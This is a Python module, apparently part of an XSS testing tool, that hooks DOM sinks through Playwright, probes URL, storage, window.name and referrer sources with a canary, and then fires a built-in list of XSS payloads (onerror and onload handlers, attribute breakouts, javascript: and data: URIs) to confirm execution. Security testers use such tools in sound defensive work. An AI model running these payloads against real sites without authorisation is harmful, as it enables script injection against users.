"""DOM XSS runtime scanner — Stage 2 of the hybrid detection pipeline.

Injects a JavaScript sink-hook init script *before* page navigation via
Playwright's add_init_script(), then drives the browser with canary strings
in every attacker-controllable source. When a hooked sink receives the canary,
taint flow is confirmed.

The module exposes two stages:
  1. `discover_dom_taint_paths()` — finds source → sink taint pairs
  2. `attempt_dom_payloads()`     — tries payloads for one tainted pair

`scan_dom_xss()` remains as a convenience wrapper that uses the static sink
payload inventory for execution attempts.

Sources tested:
  - URL query parameters (each individually replaced with the canary)
  - URL fragment (location.hash)
  - window.name             (set via init script before page JS runs)
  - localStorage values     (hook Storage.prototype.getItem to return canary)
  - sessionStorage values   (hook Storage.prototype.getItem to return canary)
  - document.referrer       (inject canary into Referer HTTP header)

Sinks hooked:
  - innerHTML, outerHTML, insertAdjacentHTML
  - eval, Function, setTimeout (string form), setInterval (string form)
  - document.write, document.writeln
  - window.open, location.assign, location.replace
  - HTMLScriptElement.prototype.src
"""
from __future__ import annotations

import logging
import os
import urllib.parse
from dataclasses import dataclass

from ai_xss_generator.browser_nav import goto_with_edge_recovery
from ai_xss_generator.console import debug as _debug
from ai_xss_generator.active.console_signals import (
    console_init_script,
    is_execution_console_text,
    strip_execution_console_text,
)

log = logging.getLogger(__name__)

_NAV_TIMEOUT_MS = 10_000
_STABILIZE_TIMEOUT_MS = 3_000
_BLOCKED_RESOURCE_TYPES = {"image", "media", "font", "stylesheet"}

# Sink-appropriate XSS payloads.  Ordered most targeted → most generic.
# document.write / writeln payloads include attribute-escape variants ('><...)
# because these sinks often write attacker data *inside* an HTML attribute
# (e.g. document.write("<iframe src='..."+location.search+"'...>")).
# The breakout prefix closes the attribute and injects the XSS element.
_SINK_PAYLOADS: dict[str, list[str]] = {
    "innerHTML":          ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<details open ontoggle=alert(1)>"],
    "outerHTML":          ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
    "insertAdjacentHTML": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
    "document.write":     [
        # Direct HTML injection (sink writes raw HTML into the page body)
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # Attribute-escape with new tags (works when < > reach the sink unencoded)
        "'><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        # Attribute-escape WITHOUT angle brackets — for URL fragment injection where
        # the browser encodes < and > in window.location but leaves ' and = intact.
        # Closes the src attribute and injects an event handler into the same tag.
        # e.g. <iframe src='URL#'onload='alert(1)' ...> fires onload.
        "'onload='alert(1)",
        "'onmouseover='alert(1)",
        "\"onload=\"alert(1)",
    ],
    "document.writeln":   [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "'onload='alert(1)",
        "\"onload=\"alert(1)",
    ],
    "eval":               ["alert(1)", "alert`1`"],
    "Function":           ["alert(1)", "alert`1`"],
    "setTimeout":         ["alert(1)", "alert`1`"],
    "setInterval":        ["alert(1)", "alert`1`"],
    # Navigation sinks — javascript: URIs execute JS in the current origin context
    "window.open":        ["javascript:alert(1)", "javascript:alert`1`"],
    "location.assign":    ["javascript:alert(1)", "javascript:alert`1`"],
    "location.replace":   ["javascript:alert(1)", "javascript:alert`1`"],
    # Script src — external script load from attacker-controlled URL
    "script.src":         ["javascript:alert(1)", "data:application/javascript,alert(1)"],
}
_DEFAULT_PAYLOADS = ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]

# Template — __CANARY__ is replaced at runtime with repr(canary_string).
# Written as a raw string so we don't have to escape every JS brace.
_HOOK_JS_TEMPLATE = r"""(function() {
    var CANARY = __CANARY__;
    window.__axss_dom_hits = [];

    function _record(sink, data) {
        var s = (data == null) ? '' : String(data);
        if (s.indexOf(CANARY) !== -1) {
            var loc = '';
            try {
                var frames = new Error().stack.split('\n').slice(2, 5);
                loc = frames.map(function(f) { return f.trim(); }).join(' → ');
            } catch(e) {}
            window.__axss_dom_hits.push({sink: sink, snippet: s.slice(0, 300), loc: loc});
        }
    }

    // innerHTML
    try {
        var _iDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
        if (_iDesc && _iDesc.set) {
            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(v) { _record('innerHTML', v); _iDesc.set.call(this, v); },
                get: _iDesc.get, configurable: true
            });
        }
    } catch(e) {}

    // outerHTML
    try {
        var _oDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML');
        if (_oDesc && _oDesc.set) {
            Object.defineProperty(Element.prototype, 'outerHTML', {
                set: function(v) { _record('outerHTML', v); _oDesc.set.call(this, v); },
                get: _oDesc.get, configurable: true
            });
        }
    } catch(e) {}

    // insertAdjacentHTML
    try {
        var _origIAH = Element.prototype.insertAdjacentHTML;
        Element.prototype.insertAdjacentHTML = function(pos, v) {
            _record('insertAdjacentHTML', v);
            return _origIAH.call(this, pos, v);
        };
    } catch(e) {}

    // document.write / writeln
    try {
        var _origWrite = document.write.bind(document);
        document.write = function() {
            for (var i = 0; i < arguments.length; i++) _record('document.write', arguments[i]);
            return _origWrite.apply(document, arguments);
        };
    } catch(e) {}
    try {
        var _origWriteln = document.writeln.bind(document);
        document.writeln = function() {
            for (var i = 0; i < arguments.length; i++) _record('document.writeln', arguments[i]);
            return _origWriteln.apply(document, arguments);
        };
    } catch(e) {}

    // eval (indirect call — preserves global scope, sufficient for detection)
    try {
        var _origEval = window.eval;
        window.eval = function(v) { _record('eval', v); return _origEval(v); };
    } catch(e) {}

    // Function constructor
    try {
        var _OrigF = Function;
        window.Function = function() {
            for (var i = 0; i < arguments.length; i++) _record('Function', arguments[i]);
            return _OrigF.apply(this, arguments);
        };
        window.Function.prototype = _OrigF.prototype;
    } catch(e) {}

    // setTimeout / setInterval — only intercept string-arg form
    try {
        var _origSTO = window.setTimeout;
        window.setTimeout = function(fn) {
            if (typeof fn === 'string') _record('setTimeout', fn);
            return _origSTO.apply(window, arguments);
        };
    } catch(e) {}
    try {
        var _origSI = window.setInterval;
        window.setInterval = function(fn) {
            if (typeof fn === 'string') _record('setInterval', fn);
            return _origSI.apply(window, arguments);
        };
    } catch(e) {}

    // window.open — record url argument
    try {
        var _origOpen = window.open;
        window.open = function(url) {
            _record('window.open', url);
            return _origOpen.apply(window, arguments);
        };
    } catch(e) {}

    // location.assign / location.replace — navigation sinks
    try {
        var _origAssign = window.location.assign.bind(window.location);
        window.location.assign = function(url) {
            _record('location.assign', url);
            return _origAssign(url);
        };
    } catch(e) {}
    try {
        var _origReplace = window.location.replace.bind(window.location);
        window.location.replace = function(url) {
            _record('location.replace', url);
            return _origReplace(url);
        };
    } catch(e) {}

    // HTMLScriptElement.prototype.src — script load from attacker-controlled URL
    try {
        var _scriptDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
        if (_scriptDesc && _scriptDesc.set) {
            Object.defineProperty(HTMLScriptElement.prototype, 'src', {
                set: function(v) { _record('script.src', v); _scriptDesc.set.call(this, v); },
                get: _scriptDesc.get, configurable: true
            });
        }
    } catch(e) {}
})();"""


# Source-injection snippets — appended to hook JS when probing non-URL sources.
# __CANARY__ is replaced at build time with repr(canary).
_WINDOW_NAME_SNIPPET = "(function() { try { window.name = __CANARY__; } catch(e) {} })();"

# Hook localStorage/sessionStorage.getItem to return canary for every key access.
# Only activates for the storage object the snippet targets (ls vs ss).
_LS_HOOK_SNIPPET = r"""(function() {
    try {
        var _origLSGet = window.localStorage.getItem.bind(window.localStorage);
        window.localStorage.getItem = function(key) {
            var v = _origLSGet(key);
            return (v !== null) ? (v + __CANARY__) : __CANARY__;
        };
    } catch(e) {}
})();"""

_SS_HOOK_SNIPPET = r"""(function() {
    try {
        var _origSSGet = window.sessionStorage.getItem.bind(window.sessionStorage);
        window.sessionStorage.getItem = function(key) {
            var v = _origSSGet(key);
            return (v !== null) ? (v + __CANARY__) : __CANARY__;
        };
    } catch(e) {}
})();"""


@dataclass
class DomXssResult:
    """One confirmed source → sink taint path for a URL."""

    url: str
    source_type: str          # "query_param" | "fragment"
    source_name: str          # param name, or "hash" for the fragment source
    sink: str                 # hooked sink name: "innerHTML" | "eval" | ...
    canary: str               # the canary string used during taint detection
    confirmed_execution: bool # True when a real XSS payload also caused JS execution
    payload_fired: str | None # the payload that triggered execution, or None
    detail: str               # human-readable summary of what was found
    fired_url: str            # full URL used for the final confirmation attempt
    code_location: str = ""   # JS call stack frames showing where the sink was reached


@dataclass
class DomTaintHit:
    """One tainted DOM source → sink path discovered at runtime."""

    url: str
    source_type: str          # "query_param" | "fragment"
    source_name: str          # param name, or "hash" for the fragment source
    sink: str                 # hooked sink name: "innerHTML" | "eval" | ...
    canary: str
    canary_url: str
    code_location: str = ""


def _make_canary() -> str:
    return "axss_" + os.urandom(4).hex()


def _build_hook_js(
    canary: str,
    inject_window_name: bool = False,
    inject_local_storage: bool = False,
    inject_session_storage: bool = False,
) -> str:
    base = _HOOK_JS_TEMPLATE.replace("__CANARY__", repr(canary))
    extras: list[str] = []
    if inject_window_name:
        extras.append(_WINDOW_NAME_SNIPPET.replace("__CANARY__", repr(canary)))
    if inject_local_storage:
        extras.append(_LS_HOOK_SNIPPET.replace("__CANARY__", repr(canary)))
    if inject_session_storage:
        extras.append(_SS_HOOK_SNIPPET.replace("__CANARY__", repr(canary)))
    if extras:
        return base + "\n" + "\n".join(extras)
    return base


def _inject_source(url: str, source_type: str, source_name: str, value: str) -> str:
    """Return *url* with *value* placed in the specified attacker-controlled source.

    For non-URL sources (window_name, local_storage, session_storage, referrer)
    the URL is returned unchanged — injection happens via init script or HTTP headers
    set up by the caller.
    """
    parsed = urllib.parse.urlparse(url)
    if source_type == "fragment":
        return urllib.parse.urlunparse(parsed._replace(fragment=value))
    if source_type == "query_param":
        params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        params[source_name] = value
        new_query = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
    # Non-URL sources: injection handled externally, return URL unchanged
    return url


def fallback_payloads_for_sink(sink: str) -> list[str]:
    """Return static fallback payloads for a tainted DOM sink."""
    return list(_SINK_PAYLOADS.get(sink, _DEFAULT_PAYLOADS))


def attempt_dom_payloads(
    browser,
    url: str,
    source_type: str,
    source_name: str,
    sink: str,
    payloads: list[object],
    auth_headers: dict[str, str],
    timeout_ms: int,
) -> tuple[bool, str, str]:
    """Try each payload in a fresh browser page.

    Returns (confirmed, payload_that_fired, detail_string).
    """
    for payload_item in payloads:
        payload = str(getattr(payload_item, "payload", payload_item) or "")
        if not payload:
            continue
        payload_url = _inject_source(url, source_type, source_name, payload)
        ctx = browser.new_context(
            ignore_https_errors=True,
            extra_http_headers={**auth_headers, "Accept": "text/html,application/xhtml+xml"},
        )
        try:
            page = ctx.new_page()
            page.add_init_script(console_init_script())
            page.route(
                "**/*",
                lambda route: route.abort()
                if route.request.resource_type in _BLOCKED_RESOURCE_TYPES
                else route.continue_(),
            )

            _confirmed = False
            _detail = ""

            def _on_dialog(dialog, _p=payload, _s=sink):
                nonlocal _confirmed, _detail
                _confirmed = True
                _detail = f"DOM XSS confirmed — sink:{_s} source:{source_name!r} payload:{_p!r}"
                try:
                    dialog.dismiss()
                except Exception:
                    pass

            def _on_console(msg, _p=payload, _s=sink):
                nonlocal _confirmed, _detail
                if not _confirmed and is_execution_console_text(msg.text):
                    _confirmed = True
                    _detail = (
                        f"DOM XSS confirmed via console.{msg.type}() — "
                        f"sink:{_s} source:{source_name!r} payload:{_p!r} "
                        f"text:{strip_execution_console_text(msg.text)!r}"
                    )

            page.on("dialog", _on_dialog)
            page.on("console", _on_console)

            ok, phases, nav_exc = goto_with_edge_recovery(
                page,
                payload_url,
                timeout_ms=timeout_ms,
                stabilize_timeout_ms=_STABILIZE_TIMEOUT_MS,
            )
            if not ok and nav_exc is not None:
                log.debug(
                    "DOM payload nav error for %s after recovery %s: %s",
                    payload_url,
                    phases,
                    nav_exc,
                )

            if _confirmed:
                return True, payload, _detail
        except Exception as exc:
            log.debug("DOM XSS execution attempt error (%s): %s", payload_url, exc)
        finally:
            try:
                ctx.close()
            except Exception:
                pass

    return False, "", ""


def discover_dom_taint_paths(
    url: str,
    browser,
    auth_headers: dict[str, str] | None = None,
    timeout_ms: int = _NAV_TIMEOUT_MS,
) -> list[DomTaintHit]:
    """Return tainted DOM source → sink paths discovered via runtime sink hooking.

    For each attacker-controllable source (query params, URL fragment, window.name,
    localStorage, sessionStorage, document.referrer):
      1. Create a fresh browser context with the sink-hook init script loaded.
      2. Navigate with the canary value injected into that source.
      3. Wait for SPA stabilization (catches Angular's async rendering).
      4. Inspect window.__axss_dom_hits for any sink that received the canary.

    Source injection strategies:
      - query_param / fragment : canary injected into the URL
      - window_name            : init script sets window.name = canary before page JS runs
      - local_storage          : Storage.prototype.getItem hooked to return canary
      - session_storage        : Storage.prototype.getItem hooked to return canary
      - referrer               : canary embedded in Referer HTTP header
    """
    hits_out: list[DomTaintHit] = []
    canary = _make_canary()
    _auth = auth_headers or {}

    parsed = urllib.parse.urlparse(url)
    raw_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))

    # URL-injectable sources
    sources: list[tuple[str, str]] = [("query_param", k) for k in raw_params]
    sources.append(("fragment", "hash"))
    # Non-URL sources: injection handled via init script / request headers
    sources += [
        ("window_name",     "window.name"),
        ("local_storage",   "localStorage"),
        ("session_storage", "sessionStorage"),
        ("referrer",        "document.referrer"),
    ]

    _debug(f"DOM XSS scan: {url}  canary={canary}  sources={[s[1] for s in sources]}")

    # Dedup: avoid reporting the same (source_name, sink) pair twice
    seen: set[tuple[str, str]] = set()

    for source_type, source_name in sources:
        # Build URL (unchanged for non-URL sources)
        canary_url = _inject_source(url, source_type, source_name, canary)

        # Build appropriate hook JS for this source
        hook_js = _build_hook_js(
            canary,
            inject_window_name=(source_type == "window_name"),
            inject_local_storage=(source_type == "local_storage"),
            inject_session_storage=(source_type == "session_storage"),
        )

        # Build HTTP headers — add Referer canary for "referrer" source
        if source_type == "referrer":
            # Embed canary in referrer URL so document.referrer contains it
            ctx_headers = {
                **_auth,
                "Accept": "text/html,application/xhtml+xml",
                "Referer": f"https://{canary}.axss-ref.example.com/",
            }
        else:
            ctx_headers = {**_auth, "Accept": "text/html,application/xhtml+xml"}

        _debug(f"  probing source={source_type}/{source_name}  url={canary_url}")
        ctx = browser.new_context(
            ignore_https_errors=True,
            extra_http_headers=ctx_headers,
        )
        try:
            page = ctx.new_page()
            page.route(
                "**/*",
                lambda route: route.abort()
                if route.request.resource_type in _BLOCKED_RESOURCE_TYPES
                else route.continue_(),
            )
            # Hook script runs before any page script — critical for catching
            # sinks called during initial page evaluation.
            page.add_init_script(hook_js)

            ok, phases, nav_exc = goto_with_edge_recovery(
                page,
                canary_url,
                timeout_ms=timeout_ms,
                stabilize_timeout_ms=_STABILIZE_TIMEOUT_MS,
            )
            if not ok and nav_exc is not None:
                log.debug(
                    "Canary nav error for %s after recovery %s: %s",
                    canary_url,
                    phases,
                    nav_exc,
                )

            try:
                hits: list[dict] = page.evaluate("window.__axss_dom_hits || []")
            except Exception:
                hits = []

            _debug(f"  hits from sink hooks: {len(hits)}")
            for hit in hits:
                sink_name: str = hit.get("sink", "unknown")
                code_loc: str = hit.get("loc", "")
                dedup_key = (source_name, sink_name)
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)

                log.debug(
                    "DOM taint: source=%s/%s → sink=%s  loc=%s",
                    source_type, source_name, sink_name, code_loc or "(unknown)",
                )
                _debug(f"  TAINT: {source_name} → {sink_name}")
                if code_loc:
                    _debug(f"    JS location: {code_loc}")

                hits_out.append(
                    DomTaintHit(
                        url=url,
                        source_type=source_type,
                        source_name=source_name,
                        sink=sink_name,
                        canary=canary,
                        canary_url=canary_url,
                        code_location=code_loc,
                    )
                )

        except Exception as exc:
            log.debug(
                "DOM XSS scan error for %s source=%s/%s: %s",
                url, source_type, source_name, exc,
            )
        finally:
            try:
                ctx.close()
            except Exception:
                pass

    return hits_out


def scan_dom_xss(
    url: str,
    browser,
    auth_headers: dict[str, str] | None = None,
    timeout_ms: int = _NAV_TIMEOUT_MS,
) -> list[DomXssResult]:
    """Scan *url* for DOM XSS using runtime taint discovery + static fallback payloads."""
    results: list[DomXssResult] = []
    _auth = auth_headers or {}

    for hit in discover_dom_taint_paths(
        url=url,
        browser=browser,
        auth_headers=auth_headers,
        timeout_ms=timeout_ms,
    ):
        payloads = fallback_payloads_for_sink(hit.sink)
        _debug(f"    trying {len(payloads)} payload(s) for sink '{hit.sink}'")
        exec_ok, exec_payload, exec_detail = attempt_dom_payloads(
            browser=browser,
            url=url,
            source_type=hit.source_type,
            source_name=hit.source_name,
            sink=hit.sink,
            payloads=payloads,
            auth_headers=_auth,
            timeout_ms=timeout_ms,
        )

        if exec_ok:
            _debug(f"    CONFIRMED execution via payload: {exec_payload!r}")
            fired_url = _inject_source(url, hit.source_type, hit.source_name, exec_payload)
            detail = exec_detail
        else:
            _debug("    taint confirmed but no payload executed (CSP or mismatch)")
            fired_url = hit.canary_url
            detail = (
                f"DOM taint confirmed — canary reached sink '{hit.sink}' via "
                f"{hit.source_type}:{hit.source_name!r}. "
                f"Real payload did not execute (possible CSP or payload mismatch)."
            )

        results.append(
            DomXssResult(
                url=url,
                source_type=hit.source_type,
                source_name=hit.source_name,
                sink=hit.sink,
                canary=hit.canary,
                confirmed_execution=exec_ok,
                payload_fired=exec_payload if exec_ok else None,
                detail=detail,
                fired_url=fired_url,
                code_location=hit.code_location,
            )
        )

    return results
